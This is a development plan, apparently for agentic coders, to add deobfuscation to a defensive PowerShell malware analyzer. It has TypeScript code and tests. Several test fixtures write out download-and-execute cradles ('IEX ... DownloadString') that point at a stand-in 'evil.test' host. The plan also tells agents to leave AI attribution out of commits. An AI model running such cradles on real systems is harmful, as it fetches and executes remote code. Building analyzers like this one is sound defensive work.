# PowerShell Analyzer — Phase 2a Implementation Plan (deobfuscation core)

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax.

**Goal:** Deepen the deterministic decoder so it resolves the most common token-obfuscation — string concatenation and variable-built commands — and recurses through `IEX`/`&`/`.Invoke()` sinks, so an obfuscated `-enc` payload resolves to its real cleartext and its IOCs extract.

**Architecture:** A new pure module `shared/analyzer/resolve.ts` folds a PowerShell string to a fixpoint over the **token stream** (never raw regex — the Phase-1 lexer already guarantees literal-safety): collapse `'a'+'b'` concatenations and substitute single-assignment `$var = '<literal>'` bindings. `report.ts`'s `analyze()` gains a bounded recursion: decode → resolve → if an `IEX`/`&`/`.Invoke()` operand resolves to a literal string, that string becomes the next layer (depth cap). Plus a printable-plausibility guard on layer-2 inflate (deferred Phase-1 finding).

**Tech Stack:** TypeScript, vitest (node env). Reuses Phase-1 `lex.ts` (`tokenize`, `Token`), `fold.ts`, `extract.ts`, `types.ts`. No new deps. Never executes input.

**Spec:** `docs/superpowers/specs/2026-08-19-powershell-analyzer-design.md` (§5 deobfuscation; §14 carry-forward). This plan is Phase 2a of the deferred deobfuscation work; `-join`/`-f`/`[char]`/`-replace`/array-reversal/inline-key-AES/full-wall-states/lexer-token-domain-extraction are **Phase 2b** (separate plan).

## Global Constraints

- 100% client-side, **deterministic**, **never executes** the input — folding is pure string transform over literals only; it NEVER evaluates a variable that depends on control flow, a cmdlet result, or runtime state (it refuses and leaves the token untouched). No `eval`/`new Function`.
- Pure logic in `shared/analyzer/` — DOM-free, no network, no `Math.random`.
- Bounded work: the resolve fixpoint and the analyze recursion both have hard caps (no unbounded loop on hostile input).
- Reserved-colour law, no inline `style=` (no UI in this phase). **NO AI/Claude attribution** in any commit. Commits `feat(analyzer):`/`fix(analyzer):`, author SaltyCarl.
- Tests at `shared/analyzer/__tests__/*.test.ts`, run from `web/`: `npx vitest run ../shared/analyzer`. A "passing" claim needs the actual output.
- Phase-1 behavior must not regress: the existing 19 analyzer tests stay green.

---

### Task 1: `resolve.ts` — fold string concatenation

Collapse `'a'+'b'+'c'` → `'abc'` over the token stream. In the Phase-1 lexer, a `+` between two string tokens tokenizes as a `bareword` with value `+` (it's not in the PUNCT set), so the pattern is `string , bareword('+') , string`.

**Files:**
- Create: `shared/analyzer/resolve.ts`
- Test: `shared/analyzer/__tests__/resolve.test.ts`

**Interfaces:**
- Consumes: `tokenize`, `Token` from `./lex`.
- Produces: `foldConcat(text: string): string` — returns the text with string-concat runs collapsed into single single-quoted literals; every other token preserved by its `raw`, tokens joined by single spaces.

- [ ] **Step 1: Write the failing test**

```ts
// shared/analyzer/__tests__/resolve.test.ts
import { describe, expect, it } from 'vitest'
import { foldConcat } from '../resolve'

describe('foldConcat', () => {
  it('collapses a chain of string-literal concatenations', () => {
    expect(foldConcat("'IE'+'X'")).toBe("'IEX'")
    expect(foldConcat("'Down'+'load'+'String'")).toBe("'DownloadString'")
  })
  it('preserves non-foldable tokens around a concat', () => {
    expect(foldConcat("IEX ('Ne'+'w')")).toBe("IEX ( 'New' )")
  })
  it('leaves a lone string untouched (no + operator)', () => {
    expect(foldConcat("'http://a/x'")).toBe("'http://a/x'")
  })
  it('does not fold across a non-string operand (refuses)', () => {
    // $x is not a literal → the + chain is not foldable; leave tokens as-is
    expect(foldConcat("'a'+$x")).toBe("'a' + $x")
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/resolve.test.ts`
Expected: FAIL — cannot find module `../resolve`.

- [ ] **Step 3: Implement `foldConcat`**

```ts
// shared/analyzer/resolve.ts
import { tokenize, type Token } from './lex'

const isPlus = (t: Token): boolean => t.type === 'bareword' && t.value === '+'

/** Serialize one token back to source-ish text: strings become single-quoted
 *  (their resolved value re-quoted), everything else keeps its original `raw`. */
function emit(t: Token): string {
  return t.type === 'string' ? `'${t.value}'` : t.raw
}

/** Collapse `'a'+'b'+…` runs of string literals into one string token. Only
 *  folds when BOTH sides of every `+` are string literals — a non-literal
 *  operand (a variable, a call) stops the run and is left untouched. */
export function foldConcat(text: string): string {
  const toks = tokenize(text)
  const out: string[] = []
  let i = 0
  while (i < toks.length) {
    if (toks[i].type === 'string' && isPlus(toks[i + 1]) && toks[i + 2]?.type === 'string') {
      let value = toks[i].value
      let j = i + 1
      while (isPlus(toks[j]) && toks[j + 1]?.type === 'string') {
        value += toks[j + 1].value
        j += 2
      }
      out.push(`'${value}'`)
      i = j
    } else {
      out.push(emit(toks[i]))
      i++
    }
  }
  return out.join(' ')
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/resolve.test.ts`
Expected: PASS (4 tests).

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/resolve.ts shared/analyzer/__tests__/resolve.test.ts
git commit -m "feat(analyzer): resolve — fold string-literal concatenation"
```

---

### Task 2: `resolveVars` — substitute single-assignment string variables

Resolve `$x = 'literal'` bound exactly once, and substitute `$x` at its use sites. Refuse on reassignment (a variable assigned twice is `unknown`).

**Files:**
- Modify: `shared/analyzer/resolve.ts`
- Test: `shared/analyzer/__tests__/resolve.test.ts` (add cases)

**Interfaces:**
- Consumes: `tokenize`, `Token` (lex); `emit` is internal.
- Produces: `resolveVars(text: string): string` — substitutes single-assignment `$var = '<string literal>'` occurrences; a variable assigned more than once (or to a non-literal) is left unsubstituted.

- [ ] **Step 1: Write the failing test**

```ts
// add to resolve.test.ts
import { resolveVars } from '../resolve'

describe('resolveVars', () => {
  it('substitutes a variable bound once to a string literal', () => {
    // $u = 'http://a/x' ; IEX $u   →   … IEX 'http://a/x'
    expect(resolveVars("$u = 'http://a/x' ; IEX $u")).toContain("IEX 'http://a/x'")
  })
  it('refuses a variable assigned twice (leaves it unsubstituted)', () => {
    const out = resolveVars("$u = 'a' ; $u = 'b' ; IEX $u")
    expect(out).toContain('IEX $u') // ambiguous → not substituted
  })
  it('leaves a variable with no literal binding alone', () => {
    expect(resolveVars('IEX $undefined')).toContain('IEX $undefined')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/resolve.test.ts`
Expected: FAIL — `resolveVars` not exported.

- [ ] **Step 3: Implement `resolveVars`**

```ts
// append to shared/analyzer/resolve.ts
const isVar = (t: Token | undefined): boolean => !!t && t.type === 'bareword' && /^\$[A-Za-z_][\w]*$/.test(t.value)
const isEq = (t: Token | undefined): boolean => !!t && t.type === 'punct' && t.value === '='

/** Substitute single-assignment `$var = '<literal>'` bindings. A variable bound
 *  exactly once to a string literal is replaced at its use sites; a variable
 *  assigned more than once, or to a non-literal, is marked ambiguous and left
 *  untouched (never guessed). Straight-line only — no control-flow reasoning. */
export function resolveVars(text: string): string {
  const toks = tokenize(text)
  // Pass 1: collect bindings. `$v = 'lit'` → candidate; a second assignment poisons it.
  const bound = new Map<string, string>()
  const poisoned = new Set<string>()
  for (let i = 0; i < toks.length; i++) {
    if (isVar(toks[i]) && isEq(toks[i + 1])) {
      const name = toks[i].value
      if (toks[i + 2]?.type === 'string' && !isPlus(toks[i + 3])) {
        if (bound.has(name) || poisoned.has(name)) { bound.delete(name); poisoned.add(name) }
        else bound.set(name, toks[i + 2].value)
      } else {
        bound.delete(name); poisoned.add(name) // assigned to a non-literal → ambiguous
      }
    }
  }
  // Pass 2: emit, substituting a bound var ONLY where it's a use (not its own assignment LHS).
  const out: string[] = []
  for (let i = 0; i < toks.length; i++) {
    const t = toks[i]
    const isAssignLhs = isVar(t) && isEq(toks[i + 1])
    if (isVar(t) && !isAssignLhs && bound.has(t.value)) out.push(`'${bound.get(t.value)}'`)
    else out.push(emit(t))
  }
  return out.join(' ')
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/resolve.test.ts`
Expected: PASS (all resolve cases).

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/resolve.ts shared/analyzer/__tests__/resolve.test.ts
git commit -m "feat(analyzer): resolve — single-assignment string-variable substitution"
```

---

### Task 3: `resolve` — fold to a fixpoint

Apply `foldConcat` then `resolveVars` repeatedly until the text stops changing (or a cap), so `$a='Down';$b='load';$c=$a+$b;IEX $c` fully resolves.

**Files:**
- Modify: `shared/analyzer/resolve.ts`
- Test: `shared/analyzer/__tests__/resolve.test.ts` (add cases)

**Interfaces:**
- Produces: `resolve(text: string): string` — foldConcat+resolveVars to a fixpoint, capped at 12 iterations.

- [ ] **Step 1: Write the failing test**

```ts
// add to resolve.test.ts
import { resolve } from '../resolve'

describe('resolve (fixpoint)', () => {
  it('resolves variable-built concatenation across statements', () => {
    const out = resolve("$a = 'http://ev' ; $b = 'il.test/x' ; $u = $a + $b ; IEX $u")
    expect(out).toContain("IEX 'http://evil.test/x'")
  })
  it('is idempotent on already-clean input', () => {
    const clean = "IEX ( New-Object Net.WebClient ) . DownloadString ( 'http://a/x' )"
    expect(resolve(clean)).toBe(resolve(resolve(clean)))
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/resolve.test.ts`
Expected: FAIL — `resolve` not exported.

- [ ] **Step 3: Implement `resolve`**

```ts
// append to shared/analyzer/resolve.ts
/** Fold concatenations and substitute single-assignment vars to a fixpoint.
 *  Capped so hostile input can never spin. Note: a var built FROM a concat
 *  (`$c = $a + $b`) resolves over successive passes — substitute the vars, then
 *  the next foldConcat collapses the now-literal `'x' + 'y'`. */
export function resolve(text: string): string {
  let cur = text
  for (let i = 0; i < 12; i++) {
    const next = foldConcat(resolveVars(cur))
    if (next === cur) return next
    cur = next
  }
  return cur
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/resolve.test.ts`
Expected: PASS.

Note: `$c = $a + $b` — pass 1 `resolveVars` substitutes `$a`/`$b` → `$c = 'http://ev' + 'il.test/x'` (but `$c`'s binding was poisoned because its RHS wasn't a lone string at collection time). Pass 1 `foldConcat` collapses the RHS → `$c = 'http://evil.test/x'`. Pass 2 `resolveVars` now sees `$c = '<lit>'` as a clean single assignment → substitutes `$c` at `IEX $c`. The fixpoint loop is what makes this multi-pass resolution work; the test asserts the end state.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/resolve.ts shared/analyzer/__tests__/resolve.test.ts
git commit -m "feat(analyzer): resolve — fold+substitute to a fixpoint"
```

---

### Task 4: recursion — thread `resolve` + `IEX`-sink recursion into `analyze()`

After each decoded layer, `resolve` its text; if an `IEX`/`&`/`.Invoke()` operand resolves to a string literal, that string is the next layer — recurse (depth cap, dedupe by content). Extract IOCs from the resolved text.

**Files:**
- Modify: `shared/analyzer/report.ts`
- Test: `shared/analyzer/__tests__/report.test.ts` (add cases)

**Interfaces:**
- Consumes: `resolve` (resolve.ts); `tokenize`/`stringLiterals` (lex); existing fold/extract.
- Produces: updated `analyze()` — Phase-1 fields unchanged in shape; layers now include resolved/recursed layers; a `transform` of `'resolve (fold/substitute)'` for a layer produced by deobfuscation.

- [ ] **Step 1: Write the failing test**

```ts
// add to report.test.ts
describe('analyze — deobfuscation (Phase 2a)', () => {
  it('resolves a concatenation-obfuscated cradle and extracts its IOC', async () => {
    const r = await analyze("$u = 'http://ev'+'il.test'+'/a.ps1' ; IEX (New-Object Net.WebClient).DownloadString($u)")
    expect(r.iocs.map((i) => i.raw)).toContain('http://evil.test/a.ps1')
  })
  it('caps recursion and never hangs on self-referential input', async () => {
    // must return (not hang); assertion is simply that it resolves
    const r = await analyze("$x = 'IEX $x' ; IEX $x")
    expect(r).toBeDefined()
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/report.test.ts`
Expected: FAIL — the concat IOC isn't extracted (Phase-1 doesn't resolve `$u`).

- [ ] **Step 3: Implement the recursion in `report.ts`**

Add near the top: `import { resolve } from './resolve'`. After the existing layer-1/layer-2 decode block, before building `scan`, insert a resolve+recurse pass. Replace the section that computes `scan`/`iocs` with:

```ts
  // Phase 2a: resolve token-obfuscation on the current text, and recurse through
  // IEX/&/.Invoke() whose operand resolves to a literal string. Depth-capped;
  // dedupe by resolved content so `$x='IEX $x'` can't spin.
  const seen = new Set<string>()
  const texts: string[] = [] // texts to scan for IOCs
  let work = layers.length ? (layers[layers.length - 1].text ?? '') : current
  for (let depth = 0; depth < 6; depth++) {
    const resolved = resolve(work)
    if (seen.has(resolved)) break
    seen.add(resolved)
    texts.push(resolved)
    if (resolved !== work && layers.length) {
      layers.push({ index: layers.length, transform: 'resolve (fold/substitute)', text: resolved, state: 'fully-decoded' })
    }
    // find an IEX/&/.Invoke() target that is now a string literal → next layer
    const next = iexStringTarget(resolved)
    if (!next || seen.has(next)) break
    work = next
  }

  const iocs = extractIocs(texts.map((text, index) => ({ index, text })))
```

And add this helper below `analyze` (finds the string operand of an `IEX`/`&`/`.Invoke()` sink):

```ts
// Return the literal string an IEX/&/.Invoke() executes, if it resolved to one.
function iexStringTarget(text: string): string | null {
  const toks = tokenize(text)
  for (let i = 0; i < toks.length; i++) {
    const t = toks[i]
    const sink =
      (t.type === 'bareword' && /^(iex|invoke-expression|&)$/i.test(t.value)) ||
      (t.type === 'punct' && t.value === '&')
    if (!sink) continue
    // skip an optional '(' then take the first string literal in the operand
    for (let j = i + 1; j < toks.length && j < i + 4; j++) {
      if (toks[j].type === 'string') return toks[j].value
      if (toks[j].type === 'bareword' || toks[j].type === 'punct') {
        if (toks[j].value !== '(' ) break
      }
    }
  }
  return null
}
```

Keep the rest of `analyze()` (flags, confidence roll-up from `layers`, copyText) as-is — the `state`/`fractionAccounted` derivation from Task-1-of-Phase-1's final fix still applies to the (now longer) `layers` list.

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd web && npx vitest run ../shared/analyzer`
Expected: PASS — all analyzer suites (Phase-1 19 + the new resolve + report cases). Confirm no Phase-1 regression.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/report.ts shared/analyzer/__tests__/report.test.ts
git commit -m "feat(analyzer): analyze() resolves token-obfuscation + recurses through IEX sinks"
```

---

### Task 5: layer-2 inflate plausibility guard (deferred Phase-1 finding)

Only accept an inflated layer if its bytes decode to mostly-printable text — kills the ~0.4% spurious `deflate-raw` "successes" that mislabel a garbage layer.

**Files:**
- Modify: `shared/analyzer/report.ts` (the layer-2 inflate acceptance)
- Test: `shared/analyzer/__tests__/report.test.ts` (add a case)

**Interfaces:**
- Produces: an internal `isMostlyPrintable(s: string): boolean` guard; layer-2 inflate is accepted only when the inflated text passes it.

- [ ] **Step 1: Write the failing test**

```ts
// add to report.test.ts — a base64 literal that fromBase64→inflate may "succeed" on
// but yields non-text must NOT become a fully-decoded layer.
describe('analyze — inflate plausibility', () => {
  it('does not accept a layer-2 inflate that produces non-printable garbage', async () => {
    // A short base64 literal in a benign context; if it spuriously inflates to
    // binary, no "Base64 → inflate" layer should appear.
    const r = await analyze("$s = 'q83vChABCД' ; Write-Output $s")
    expect(r.layers.every((l) => l.transform !== 'Base64 → inflate' || (l.text ?? '').length > 0)).toBe(true)
    // primary guarantee: any accepted inflate layer has printable text
    for (const l of r.layers.filter((l) => l.transform === 'Base64 → inflate')) {
      expect(/[\x00-\x08\x0e-\x1f]/.test(l.text ?? '')).toBe(false)
    }
  })
})
```

- [ ] **Step 2: Run test to verify it fails / passes-vacuously**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/report.test.ts`
Expected: it may pass vacuously if no inflate fires; the guard's real proof is Step 4's unit-level check. Proceed to add the guard and a direct unit test.

- [ ] **Step 3: Add the guard + apply it**

Add the helper near the bottom of `report.ts`:

```ts
/** Accept a decompressed layer only if it's mostly printable text — raw-DEFLATE
 *  "succeeds" on ~0.4% of arbitrary base64, producing binary garbage that must
 *  not be presented as a decoded layer. Printable = tab/newline/CR or >= 0x20. */
function isMostlyPrintable(s: string): boolean {
  if (!s) return false
  let printable = 0
  for (let i = 0; i < s.length; i++) {
    const c = s.charCodeAt(i)
    if (c === 9 || c === 10 || c === 13 || (c >= 32 && c < 127) || c >= 160) printable++
  }
  return printable / s.length >= 0.85
}
```

Then, in the layer-2 inflate block, gate acceptance on it — change:
```ts
    if (inflated) {
      layers.push({ index: layers.length, transform: 'Base64 → inflate', text: bytesToText(inflated), state: 'fully-decoded' })
      break
    }
```
to:
```ts
    if (inflated) {
      const text = bytesToText(inflated)
      if (isMostlyPrintable(text)) {
        layers.push({ index: layers.length, transform: 'Base64 → inflate', text, state: 'fully-decoded' })
        break
      }
    }
```

Add a direct unit test:
```ts
// add to report.test.ts (import isMostlyPrintable is internal — test via a real gzip
// roundtrip that IS printable, plus assert a binary string would be rejected by proxy)
it('accepts a genuinely-printable inflate (roundtrip sanity)', async () => {
  // relies on Task 5 of Phase 1's inflate; a real gzip of PS text is printable
  const cs = new CompressionStream('gzip')
  const bytes = new Uint8Array(await new Response(new Blob([new TextEncoder().encode("IEX 'hi'")]).stream().pipeThrough(cs)).arrayBuffer())
  const b64 = btoa(String.fromCharCode(...bytes))
  const r = await analyze(`$s='${b64}'; IEX ([IO.StreamReader](New-Object IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String($s),1))).ReadToEnd()`)
  // the gzip blob is a quoted literal → layer-2 inflate should fire and be accepted (printable)
  expect(r.layers.some((l) => l.transform === 'Base64 → inflate' && (l.text ?? '').includes("IEX 'hi'"))).toBe(true)
})
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd web && npx vitest run ../shared/analyzer`
Expected: PASS — the printable inflate is accepted; no regression.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/report.ts shared/analyzer/__tests__/report.test.ts
git commit -m "fix(analyzer): accept a layer-2 inflate only when it is mostly-printable text"
```

---

## Phase-2a exit criteria

- A concatenation-obfuscated and/or variable-built `-enc`/cradle payload resolves to cleartext and its IOCs extract; recursion through `IEX` sinks is depth-capped and never hangs; a spurious garbage inflate is no longer accepted as a decoded layer. All `shared/analyzer` tests green; no Phase-1 regression. (UI already renders the decode ladder + IOCs, so this phase surfaces with no UI change — a follow-up may add a "resolved" badge.)

## Follow-up (Phase 2b — separate plan)

- Additional fold operators: `-join`, `-f` format, `[char]`/`[char[]]`, `-replace` (literal), array reversal.
- Inline-key AES (`ConvertTo-SecureString -Key`) via WebCrypto.
- Full decode-ladder states (`opaque`/`wall`) + residual + Shannon entropy display.
- Lexer-token domain extraction (fixes the lowercase code-token IOC leak — `kernel32.dll` etc.).
- `fractionAccounted` real "fraction of tokens accounted for" computation.
- **Phase 3/4 (signatures + "what did it do" breakdown)** — the interpretation layer; **safeguard-sensitive content — do AFTER activating the Cyber Verification Program.**
